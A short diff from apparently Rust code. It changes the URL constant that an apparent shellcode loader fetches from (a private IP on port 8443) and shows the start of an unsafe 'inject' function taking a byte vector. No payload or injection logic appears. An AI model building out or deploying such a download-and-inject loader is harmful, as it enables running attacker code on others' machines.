@@ -24,7 +24,7 @@ use reqwest::get;
 
 // CONSTANTS
 // Define url here
-const URL: &str = "http://10.1.99.113:8443/foo";
+const URL: &str = "http://192.168.1.114:8443/foo";
 
 fn inject(sc: Vec<u8>) {
     unsafe {
